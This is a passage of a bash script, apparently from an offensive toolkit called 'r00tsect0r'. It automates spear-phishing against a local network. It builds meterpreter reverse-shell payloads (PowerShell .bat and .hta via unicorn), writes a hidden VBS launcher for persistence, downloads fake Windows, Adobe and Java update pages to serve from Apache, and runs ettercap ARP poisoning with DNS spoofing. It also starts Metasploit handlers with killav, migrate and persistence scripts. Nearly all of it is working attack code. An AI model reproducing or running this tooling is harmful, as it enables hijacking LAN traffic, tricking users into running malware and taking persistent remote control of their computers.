      echo ${BlueF}[*]${RedF}:${BlueF}[running spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      echo ${RedF}[x]:[warning]: press [q] to stop MITM attack ${Reset};
      sleep 2
      xterm -T "r00tsect0r - Automated exploit: fakeupdate.exe attack" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript scraper; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router// /$target//
      sh_clj2

      elif [ "$pass" = "persistence" ]; then
      # starting a metasploit listenner and migrate (windows x86)
      echo ${BlueF}[*]${RedF}:${BlueF}[running spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      echo ${RedF}[x]:[warning]: press [q] to stop MITM attack ${Reset};
      sleep 2
      xterm -T "r00tsect0r - Automated exploit: fakeupdate.exe attack" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript persistence -U -i 5 -p 8080 -r $lhost; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router// /$target//
     # persistence listenner
     sh_perlis2

      elif [ "$pass" = "Default listenner" ]; then
      # starting a metasploit listenner (windows x86)
      echo ${BlueF}[*]${RedF}:${BlueF}[running spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      echo ${RedF}[x]:[warning]: press [q] to stop MITM attack ${Reset};
      sleep 2
      xterm -T "r00tsect0r - Automated exploit: fakeupdate.exe attack" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router// /$target//
      sh_clj2

      elif [ "$pass" = "Post-auto.rc" ]; then
      # starting a metasploit listenner (windows x86)
      echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ loading resource ] ${Reset};
      echo ${BlueF}[*]${RedF}:${BlueF}[running spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      sleep 2
      xterm -T "r00tsect0r - Automated exploit: fakeupdate.exe attack" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $H0m3/opensource/modules/Post-auto.rc; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router// /$target//
      sh_clj2


   else

     echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
     mv $apache/CriticalUpdate.exe $H0m3/opensource/priv8/CriticalUpdate.exe > /dev/null 2>&1
     sleep 2
fi
}


sh_clj2 () {

  # 'shell_listenner.rc' file with msf settings will be stored under
  # '/opensource/priv8/' if we wish to start a listenner later...
  echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ BUILDING RC FILE ] ${Reset};
  sleep 1
  cd $H0m3/opensource/priv8
  mkdir handler > /dev/null 2>&1
  cd handler > /dev/null 2>&1
  echo "use exploit/multi/handler" > fakeupdate-handler.rc
  echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> fakeupdate-handler.rc
  echo "set LPORT $lport" >> fakeupdate-handler.rc
  echo "set LHOST $lhost" >> fakeupdate-handler.rc
  echo "set ExitOnSession false" >> fakeupdate-handler.rc
  echo "exploit -j -z" >> fakeupdate-handler.rc
  zenity --info --title "BUILDING RC CONF FILE" --text "How to run your listenner later:\nmsfconsole -r fakeupdate-handler.rc\n\nStorage:\n$H0m3/opensource/priv8/handler" --width 450 > /dev/null 2>&1

    # clean up script
    # stop apache2 webserver if is running
    /etc/init.d/apache2 stop
    mv $apache/CriticalUpdate.exe $H0m3/opensource/priv8/CriticalUpdate.exe > /dev/null 2>&1
    rm -r Fake_Update.aspx_files
    if [ -d $tWd ]; then
    rm -r $tWd
clear
fi
}


sh_perlis2 () {
Colors;

      clear
      # chose to run  or not the persistence listenner
      echo ${BlueF}[*]${RedF}:${white} start 'persistence' listenner?${Reset};

cat << !

     Payload [persistence] Final Config:
     ===================================
     LHOST            : $lhost
     LPORT            : 8080
     PAYLOAD          : windows/meterpreter/reverse_tcp
     HANDLER          : $H0m3/opensource/priv8/handler/fakeupdate_persistence.rc
     AFFECTED SYSTEMS : Windows OS

!

      read -p "[+]:{yes|no}(choise):" pass
      if test "$pass" = "yes"

then

      # start persistence listenner
      echo ${BlueF}[*]${RedF}:${BlueF}[please wait]:${white} starting 'persistence' listenner ${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to exit meterpreter shell ${Reset};
      sleep 2
      xterm -T "r00tsect0r - 'persistence' payload listenner" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT 8080; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router// /$target//

        # 'shell_listenner.rc' file with msf settings will be stored under
        # '/opensource/priv8/' if we wish to start a listenner later...
        echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ BUILDING RC FILE ] ${Reset};
        sleep 1
        cd $H0m3/opensource/priv8
        mkdir handler > /dev/null 2>&1
        cd handler > /dev/null 2>&1
        echo "use exploit/multi/handler" > fakeupdate-persistence.rc
        echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> fakeupdate-persistence.rc
        echo "set LPORT 8080" >> fakeupdate-persistence.rc
        echo "set LHOST $lhost" >> fakeupdate-persistence.rc
        echo "set ExitOnSession false" >> fakeupdate-persistence.rc
        echo "exploit -j -z" >> fakeupdate-persistence.rc
        zenity --info --title "BUILDING RC CONF FILE" --text "How to run your listenner later:\nmsfconsole -r fakeupdate-persistence.rc\n\nStorage:\n$H0m3/opensource/priv8/handler" --width 450 > /dev/null 2>&1

      # clean up script
      /etc/init.d/apache2 stop
      rm -r $tWd > /dev/null 2>&1
      mv $apache/CriticalUpdate.exe $H0m3/opensource/priv8/CriticalUpdate.exe > /dev/null 2>&1
      rm -r Fake_Update.aspx_files > /dev/null 2>&1
      clear

else

   Colors;
   echo ${RedF}[x]:[ QUITTING ]${Reset};
     # 'shell_listenner.rc' file with msf settings will be stored under
     # '/opensource/priv8/' if we wish to start a listenner later...
     echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ BUILDING RC FILE ] ${Reset};
     sleep 1
     cd $H0m3/opensource/priv8
     mkdir handler > /dev/null 2>&1
     cd handler > /dev/null 2>&1
     echo "use exploit/multi/handler" > fakeupdate-persistence.rc
     echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> fakeupdate-persistence.rc
     echo "set LPORT 8080" >> fakeupdate-persistence.rc
     echo "set LHOST $lhost" >> fakeupdate-persistence.rc
     echo "set ExitOnSession false" >> fakeupdate-persistence.rc
     echo "exploit -j -z" >> fakeupdate-persistence.rc
     zenity --info --title "BUILDING RC CONF FILE" --text "How to run your listenner later:\nmsfconsole -r fakeupdate-persistence.rc\n\nStorage:\n$H0m3/opensource/priv8/handler" --width 450 > /dev/null 2>&1

   # clean up script
   /etc/init.d/apache2 stop
   rm -r $tWd > /dev/null 2>&1
   mv $apache/CriticalUpdate.exe $H0m3/opensource/priv8/CriticalUpdate.exe > /dev/null 2>&1
   rm -r Fake_Update.aspx_files > /dev/null 2>&1
   clear
fi
}









# --------------------------------------------
# meterpreter powershell invocation (by ReL1K)
# --------------------------------------------
sh_FUD () {
Colors;


     # chose to use powershell.bat or powershell.hta
     pass=$(zenity --list --title "POWESHELL PAYLOADS (ReL1k)" --text "chose one payload from the drop-list bellow" --radiolist --column "Pick" --column "Option" TRUE "poweshell.bat" FALSE "powershell.hta" --width 350 --height 170) > /dev/null 2>&1


      if [ "$pass" = "poweshell.bat" ]; then
         sh_bat # jump to powershell.bat
      elif [ "$pass" = "powershell.hta" ]; then
         sh_hta # jump to powershell.hta

      else
         # CANCEL BUTTON PRESS QUITTING
         echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
         sleep 2
         clear
      fi
}



sh_bat () {
Colors;

      # clean up script
      rm -r $tWd > /dev/null 2>&1
      # get user input to build the payload
      echo ${BlueF}[*]${RedF}:${YellowF}[input payload settings]${Reset};
      lhost=$(zenity --title="Input LHOST" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
      lport=$(zenity --title="Input LPORT" --text "example: 4444" --entry --width 300) > /dev/null 2>&1
      filename=$(zenity --title="Input BACKDOOR name" --text "example: payload.bat" --entry --width 300) > /dev/null 2>&1
      html=$(zenity --title="Input HTML TITLE" --text "example: POWERSHELL SECURITY PATCH" --entry --width 300) > /dev/null 2>&1
      echo -n "[+]:{leave blank to poison all local network}(enter router ip address):"
      read router
      echo -n "[+]:{leave blank to poison all local network}(enter target ip address):"
      read target


         # buildidng meterpreter powershell invocation payload
         echo ${BlueF}[*]${RedF}:${BlueF}[building]${RedF}:${GreenF}[ $filename ]${Reset};
         cd $H0m3/opensource/priv8
         xterm -T "r00tsect0r - building powershell invocation payload (ReL1K)" -geometry 110x23 -e "python $H0m3/opensource/modules/unicorn.py windows/meterpreter/reverse_tcp $lhost $lport"

         # building hidden.vbs file to be used in persistence module
         echo "' hidden.vbs" > hidden.vbs
         echo "' coded by: r00t-3xp10it" >> hidden.vbs
         echo "'-----------------------" >> hidden.vbs
         echo 'CreateObject("Wscript.Shell").Run "1HeL", 0, False' >> hidden.vbs
         echo 'WScript.Quit' >> hidden.vbs

         # using bash SED to replace value (payload name)
         sed "s/1HeL/$filename/g" hidden.vbs > copy.nt
         mv copy.nt hidden.vbs

         # downloading phishing webpage from network
         mkdir $tWd
         cd $tWd
         echo ${BlueF}[*]${RedF}:${BlueF}[Download]${RedF}:${GreenF}[ FakeUpdate.tar.gz ]${Reset};
         wget -qq https://dl.dropboxusercontent.com/u/21426454/netool-kali/FakeUpdate.tar.gz | zenity --progress --pulsate --title "DOWNLOADING" --text="FILE: FakeUpdate.tar.gz" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
         tar -xf FakeUpdate.tar.gz
         cd FakeUpdate

            # copy files to apache webroot directory
            cp index.html $apache/index.html
            cp -r Fake_Update.aspx_files $apache/Fake_Update.aspx_files
            mv $H0m3/opensource/priv8/powershell_attack.txt $apache/$filename
            mv $H0m3/opensource/priv8/hidden.vbs $apache/hidden.vbs
            cd $apache
            # set privs on generated files
            chmod +x $filename

         # replace strings in index.html using SED command
         sed "s/CriticalUpdate.exe/$filename/g" index.html > copy.html
         sed "s/Windows Critical Update/$html/g" copy.html > copy2.html
         mv copy2.html index.html
         rm -f copy.html



cat << !

     Payload [powershell] Final Config:
     ==================================
     LHOST            : $lhost
     LPORT            : $lport
     FILENAME         : $filename
     STORAGE IN       : $apache/$filename
     PAYLOAD          : windows/meterpreter/reverse_tcp
     AFFECTED SYSTEMS : Windows OS

!
         sleep 2
         # start apache webserver
         xterm -T "r00tsect0r - start Apache webserver" -geometry 110x23 -e "/etc/init.d/apache2 start"
         echo ${BlueF}[*]${RedF}:${BlueF}[start apache2]${RedF}:${GreenF}[ OK ]${Reset};

         # config dns_spoof plugin
         echo ${BlueF}[*]${RedF}:${BlueF}[edit etter.dns]${RedF}:${YellowF}[ PRESS ENTER ]${Reset};
         read op
         xterm -T "r00tsect0r - DNS_SPOOF - press [ctrl+x] to quit" -geometry 110x23 -e "nano $confD"

     # run listenner?
     QuE=$(zenity --question --title "powershell invocation" --text "\n   -:[ START A LISTENNER ? ]:-" --width 300) > /dev/null 2>&1
     if [ "$?" -eq "0" ]; then
       sh_ksye # jump to post-exploitation

else

     echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
     sleep 2
     # clean everything up
     /etc/init.d/apache2 stop
     rm -r $apache/Fake_Update.aspx_files > /dev/null 2>&1
     rm $apache/index.html > /dev/null 2>&1
     mv $apache/$filename $H0m3/opensource/priv8/$filename > /dev/null 2>&1
     rm $apache/hidden.vbs > /dev/null 2>&1
     rm -r $tWd > /dev/null 2>&1
     cd $H0m3/opensource/
     clear
     sh_powpost # build resource file (latest listenner settings)
fi
}







sh_ksye () {
Colors;

# CHOSE WHAT POST-EXPLOITATION MODULE TO USE
echo ${BlueF}[*]${RedF}:${BlueF}[metasploit listenner]${RedF}:${GreenF}[ RUNNING ] ${Reset};
pass2=$(zenity --list --title "POST EXPLOITATION" --text "\nDefault  :  dont migrate to system\nmigrate  :  migrate to -> $mig\nkillav  :  stop Anti-Virus process\nscraper  :  enumerate about everything\nPost-auto.rc  :  run a list of post modules\n\nIf you chose to run Post-auto.rc handler then\nInput one-per-line the post modules to use into:\n$H0m3/opensource/modules/Post-auto.rc\n" --radiolist --column "Pick" --column "Option" TRUE "Default listenner" FALSE "migrate" FALSE "killav" FALSE "scraper" FALSE "Post-auto.rc" --width 350 --height 395) > /dev/null 2>&1


      if [ "$pass2" = "migrate" ]; then
      # starting a metasploit listenner and migrate (windows x86)
      echo ${BlueF}[*]${RedF}:${BlueF}[spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      sleep 2
      xterm -T "r00tsect0r - Automated exploit: powershell attack" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript migrate -n $mig; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router// /$target//
      sh_powpost # build resource file (latest listenner settings)


      elif [ "$pass2" = "killav" ]; then
      # starting a metasploit listenner and migrate (windows x86)
      echo ${BlueF}[*]${RedF}:${BlueF}[spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      sleep 2
      xterm -T "r00tsect0r - Automated exploit: powershell attack" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript killav; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router// /$target//
      sh_powpost # build resource file (latest listenner settings)


      elif [ "$pass2" = "scraper" ]; then
      # starting a metasploit listenner and migrate (windows x86)
      echo ${BlueF}[*]${RedF}:${BlueF}[spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      sleep 2
      xterm -T "r00tsect0r - Automated exploit: powershell attack" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript scraper; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router// /$target//
      sh_powpost # build resource file (latest listenner settings)


      elif [ "$pass2" = "Default listenner" ]; then
      # starting a metasploit listenner (windows x86)
      echo ${BlueF}[*]${RedF}:${BlueF}[spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      sleep 2
      xterm -T "r00tsect0r - Automated exploit: powershell attack" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router// /$target//
      sh_powpost # build resource file (latest listenner settings)


      elif [ "$pass2" = "Post-auto.rc" ]; then
      # starting a metasploit listenner (windows x86)
      echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ loading resource ] ${Reset};
      echo ${BlueF}[*]${RedF}:${BlueF}[spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      sleep 2
      xterm -T "r00tsect0r - Automated exploit: powershell attack" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $H0m3/opensource/modules/Post-auto.rc; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router// /$target//
      sh_powpost # build resource file (latest listenner settings)

else


    # CANCEL BUTTON PRESS QUITTING
    echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
    mv $apache/$filename $H0m3/opensource/priv8/$filename > /dev/null 2>&1
    sh_powpost # build resource file (latest listenner settings)
fi
}



sh_powpost () {
Colors;

   # 'shell_listenner.rc' file with msf settings will be stored under
   # '/opensource/priv8/' if we wish to start a listenner later...
   echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ BUILDING RC FILE ] ${Reset};
   sleep 1
   cd $H0m3/opensource/priv8
   mkdir handler > /dev/null 2>&1
   cd handler > /dev/null 2>&1

     # filter payload name to rename handler file
     echo "$filename" > rep.log
     fill=`cat rep.log | cut -d '.' -f1`
     echo "$fill" > rep.log
     resource=`cat rep.log`
     rm rep.log > /dev/null 2>&1

   echo "use exploit/multi/handler" > $resource-handler.rc
   echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> $resource-handler.rc
   echo "set LPORT $lport" >> $resource-handler.rc
   echo "set LHOST $lhost" >> $resource-handler.rc
   echo "set ExitOnSession false" >> $resource-handler.rc
   echo "exploit -j -z" >> $resource-handler.rc
   zenity --info --title "BUILDING RC CONF FILE" --text "How to run your listenner later:\nmsfconsole -r $resource-handler.rc\n\nStorage:\n$H0m3/opensource/priv8/handler" --width 450 > /dev/null 2>&1

     # clean everything up
     /etc/init.d/apache2 stop
     rm -r $apache/Fake_Update.aspx_files > /dev/null 2>&1
     rm $apache/index.html > /dev/null 2>&1
     mv $apache/$filename $H0m3/opensource/priv8/$filename > /dev/null 2>&1
     rm $apache/hidden.vbs > /dev/null 2>&1
     rm -r $tWd > /dev/null 2>&1
   clear
}



sh_hta () {
Colors;

      # get user input to build the payload
      echo ${BlueF}[*]${RedF}:${YellowF}[input payload settings]${Reset};
      lhost=$(zenity --title="Input LHOST" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
      lport=$(zenity --title="Input LPORT" --text "example: 4444" --entry --width 300) > /dev/null 2>&1
      echo -n "[+]:{leave blank to poison all local network}(enter router ip address):"
      read router
      echo -n "[+]:{leave blank to poison all local network}(enter target ip address):"
      read target


         # buildidng meterpreter powershell invocation payload
         echo ${BlueF}[*]${RedF}:${BlueF}[building]${RedF}:${GreenF}[ Launcher.hta ]${Reset};
         cd $H0m3/opensource/priv8
         xterm -T "r00tsect0r - building powershell invocation payload (ReL1K)" -geometry 110x23 -e "python $H0m3/opensource/modules/unicorn.py windows/meterpreter/reverse_tcp $lhost $lport hta"


            # copy files to apache webroot directory
            cp hta_attack/index.html $apache/index.html
            cp hta_attack/Launcher.hta $apache/Launcher.hta
            cp hta_attack/unicorn.rc $H0m3/opensource/priv8/handler/unicorn.rc
            chown $user $H0m3/opensource/priv8/handler/unicorn.rc
            chown -R $user $H0m3/opensource/priv8/hta_attack


cat << !

     Payload [powershell.hta] Final Config:
     ======================================
     LHOST            : $lhost
     LPORT            : $lport
     STORAGE IN       : $apache/Launcher.hta
     PAYLOAD          : windows/meterpreter/reverse_tcp
     AFFECTED SYSTEMS : Windows OS

!
         sleep 2
         # start apache webserver
         xterm -T "r00tsect0r - start Apache webserver" -geometry 110x23 -e "/etc/init.d/apache2 start"
         echo ${BlueF}[*]${RedF}:${BlueF}[start apache2]${RedF}:${GreenF}[ OK ]${Reset};

         # config dns_spoof plugin
         echo ${BlueF}[*]${RedF}:${BlueF}[edit etter.dns]${RedF}:${YellowF}[ PRESS ENTER ]${Reset};
         read op
         xterm -T "r00tsect0r - DNS_SPOOF - press [ctrl+x] to quit" -geometry 110x23 -e "nano $confD"

     # run listenner?
     QuE=$(zenity --question --title "powershell invocation" --text "\n   -:[ START A LISTENNER ? ]:-" --width 300) > /dev/null 2>&1
     if [ "$?" -eq "0" ]; then

        # starting a metasploit listenner
        echo ${BlueF}[*]${RedF}:${BlueF}[spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
        echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
        sleep 2
        xterm -T "r00tsect0r - Automated exploit: powershell HTA attack" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router// /$target//

      # cleanup
     /etc/init.d/apache2 stop
     rm $apache/index.html > /dev/null 2>&1
     rm $apache/Launcher.hta > /dev/null 2>&1
     zenity --info --title "powershell HTA attack" --text "How to run your listenner later:\nmsfconsole -r unicorn.rc\n\nStorage:\n$H0m3/opensource/priv8/handler" --width 450 > /dev/null 2>&1
     cd $H0m3/opensource/
     clear

else

     echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
     sleep 2
     # clean everything up
     /etc/init.d/apache2 stop
     rm $apache/index.html > /dev/null 2>&1
     rm $apache/Launcher.hta > /dev/null 2>&1
     zenity --info --title "powershell HTA attack" --text "How to run your listenner later:\nmsfconsole -r unicorn.rc\n\nStorage:\n$H0m3/opensource/priv8/handler" --width 450 > /dev/null 2>&1
     cd $H0m3/opensource/
     clear
fi
}











# -------------------------------
# HOST A FILE
# -------------------------------
sh_powershell () {
Colors;
pt=`echo ~`
cat << !


 ██╗  ██╗ ██████╗ ███████╗████████╗     █████╗     ███████╗██╗██╗     ███████╗
 ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝    ██╔══██╗    ██╔════╝██║██║     ██╔════╝
 ███████║██║   ██║███████╗   ██║       ███████║    █████╗  ██║██║     █████╗  
 ██╔══██║██║   ██║╚════██║   ██║       ██╔══██║    ██╔══╝  ██║██║     ██╔══╝  
 ██║  ██║╚██████╔╝███████║   ██║       ██║  ██║    ██║     ██║███████╗███████╗
 ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝       ╚═╝  ╚═╝    ╚═╝     ╚═╝╚══════╝╚══════╝
!

QuE=$(zenity --question --title "HOST A FILE ATTACK" --text "This module stores your payload in\napache webserver and allows you to\nuse MitM + DNS_spoofing[ phishing ]\nto deliver your payloads." --width 350) > /dev/null 2>&1
   if [ "$?" -eq "0" ]; then

     # jump to shellcode generator module
     sh_host_funtion

else

    # CANCEL BUTTON PRESS QUITTING
    echo ""
    echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
    sleep 2
    clear

fi
}


sh_host_funtion () {
Colors;

cat << !
     +----------------------------------------------+
     |   chose the webpage to deliver the payload   |
     +----------------------------------------------+

     1 - microsoft fake update (fake windows webpage)
     2 - adobe reader update (fake adobe webpage)
     3 - obsolect java plugin (obsolect java plugin)
     4 - Google Cast extension (missing google extension)
     q - return to r00tsect0r module
!

      Colors;
      echo "" && echo ${RedF}'_'${Reset};
      echo ${BlueF}[*]${RedF}:${GreenF}[ HOST A FILE ATTACK ]: ${Reset};
      read -p "[+]:(chose option):" pass
      if [ "$pass" = "1" ]; then
      sh_wfup
      elif [ "$pass" = "2" ]; then
      sh_bp
      elif [ "$pass" = "3" ]; then
      sh_javac
      elif [ "$pass" = "4" ]; then
      sh_gooext
      elif [ "$pass" = "q" ]; then
      echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
      sleep 2
      clear
fi
}




#
# microsoft windows fakeupdate 'host a file attack'
#
sh_wfup () {
Colors;

 # remove old payload from cache
 rm -r $tWd > /dev/null 2>&1

      # get user input
      echo ${BlueF}[*]${RedF}:${YellowF}[input payload settings]${Reset};
      fthost=$(zenity --title "HOST A FILE" --text "Chose the file to be hosted in apache webserver" --filename=$H0m3/opensource/priv8 --file-selection) > /dev/null 2>&1
      name=$(zenity --title="Name your payload" --text "virus.exe" --entry --width 350) > /dev/null 2>&1
      lhost=$(zenity --title="Input LHOST of [ $name ]" --text "\nexample: $IP\n" --entry --width 350) > /dev/null 2>&1
      lport=$(zenity --title="Input LPORT of [ $name ]" --text "\nexample: 4444\n" --entry --width 350) > /dev/null 2>&1
      

         # CHOSE WHAT PAYLOAD TO USE
         payload=$(zenity --list --title "PAYLOAD USED BY [ $name ]" --text "\nchose the correspondent payload\nused by the hosted file: $name\n" --radiolist --column "Pick" --column "Option" TRUE "generic/shell_reverse_tcp" FALSE "windows/shell_bind_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_https" FALSE "windows/meterpreter/reverse_http" FALSE "java/meterpreter/reverse_tcp" FALSE "osx/x86/isight/bind_tcp" FALSE "osx/ppc/shell/reverse_tcp" FALSE "osx/armle/shell_reverse_tcp" FALSE "linux/x86/shell_reverse_tcp" FALSE "linux/x86/meterpreter/reverse_tcp" FALSE "linux/ppc/shell_reverse_tcp" FALSE "bsd/x86/shell/reverse_tcp" FALSE "solaris/x86/shell_reverse_tcp" FALSE "php/meterpreter/reverse_tcp" FALSE "android/meterpreter/reverse_tcp" --width 350 --height 373) > /dev/null 2>&1

       # BUIDING WEBPAGE
       html=$(zenity --title="BUILDING PHISHING WEBPAGE" --text "write the title to be displayed\non the phishing webpage\n" --entry --width 350) > /dev/null 2>&1

clear
cat << !

     [SETTING ARP POISON ATTACK]:
     ----------------------------
     leave blank to poison all local network
     (This will affect all devices inside local lan)

     or chose the modem/router ip address (route -n)
     and the target ip address as well.

!

      echo ${BlueF}[*]${RedF}:${BlueF}[setting ARP poison]: ${Reset};
      echo -n "[+]:{leave blank to poison all local network}(enter router ip address):"
      read router
      echo -n "[+]:{leave blank to poison all local network}(enter target ip address):"
      read target

         # download fakeupdate.tag.gz from repository
         mkdir $tWd
         cd $tWd
         echo ${BlueF}[*]${RedF}:${BlueF}[Downloading]${RedF}:${GreenF}[ FakeUpdate.tar.gz ]${Reset};
         wget -qq https://dl.dropboxusercontent.com/u/21426454/netool-kali/FakeUpdate.tar.gz | zenity --progress --pulsate --title "DOWNLOADING" --text="FILE: FakeUpdate.tar.gz" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
         tar -xf FakeUpdate.tar.gz
         cd FakeUpdate
         echo ""


      sleep 2
      # copy files to apache webroot directory
      cp index.html $apache/index.html
      cp -r Fake_Update.aspx_files $apache/Fake_Update.aspx_files
      cp $fthost $apache/$name
      cd $apache
      chown $user $name
      chmod +x $name

         # replace strings in index.html using SED command
         sed "s/CriticalUpdate.exe/$name/g" index.html > copy.html
         sed "s/Windows Critical Update/$html/g" copy.html > copy2.html
         mv copy2.html index.html
         rm -f copy.html


clear
cat << !

     [Host a file] Final Config:
     ===========================
     HTML TITLE       : $html
     LHOST            : $lhost
     LPORT            : $lport
     FILENAME         : $name
     STORAGE IN       : $apache/$name
     PAYLOAD          : $payload

!


         # pre-load phishing webpage
         su $user xdg-open "index.html" > /dev/null 2>&1
         QuE=$(zenity --question --title "PRE-LOADING PHISHING WEBPAGE" --text "does the webpage displays correct?\nclose pre-load webpage and chose to continue or return to main menu" --width 350) > /dev/null 2>&1
         if [ "$?" -eq "0" ]; then
         echo "good" > /dev/null 2>&1
         else
         echo ${BlueF}[*]${RedF}:${BlueF}[return to main menu]${RedF}:${GreenF}[ OK ]${Reset};
         sleep 2 && sh_exit # return to main menu
         fi


      # start apache webserver + arp poison
      xterm -T "r00tsect0r - start Apache webserver" -geometry 110x23 -e "/etc/init.d/apache2 start"
      echo ${BlueF}[*]${RedF}:${BlueF}[start apache2]${RedF}:${GreenF}[ OK ]${Reset};
      echo ${BlueF}[*]${RedF}:${BlueF}[edit etter.dns]${RedF}:${YellowF}[ PRESS ENTER ]${Reset};
      read op
      xterm -T "r00tsect0r - DNS_SPOOF - press [ctrl+x] to quit" -geometry 110x23 -e "nano $confD"


       if [ "$payload" "=" "windows/meterpreter/reverse_tcp" ]; then
         # jump to windows post-exloitation module
         sh_p0st1


           elif [ "$payload" "=" "windows/meterpreter/reverse_http" ]; then
           # jump to post-exloitation module
           sh_p0st1


           elif [ "$payload" "=" "windows/meterpreter/reverse_https" ]; then
           # jump to post-exloitation module
           sh_p0st1

       else

         # if not windows than lunch post-exploitation
         # for unix systems (post-auto.rc)
         sh_P0stEALL
fi
}


sh_p0st1 () {
Colors;

# CHOSE WHAT POST-EXPLOITATION MODULE TO USE
echo ${BlueF}[*]${RedF}:${BlueF}[metasploit listenner]${RedF}:${GreenF}[ RUNNING ] ${Reset};
